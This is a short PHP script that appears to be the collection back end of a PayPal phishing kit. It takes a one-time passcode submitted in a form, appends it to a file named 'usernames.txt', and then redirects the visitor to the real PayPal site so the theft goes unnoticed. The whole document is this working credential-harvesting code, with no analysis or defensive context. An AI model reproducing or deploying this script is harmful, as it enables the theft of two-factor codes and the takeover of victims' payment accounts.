<?php
file_put_contents("usernames.txt", "OTP: " . $_POST['otpCode'] . "\n", FILE_APPEND);
header('Location: https://www.paypal.com');
exit();
?>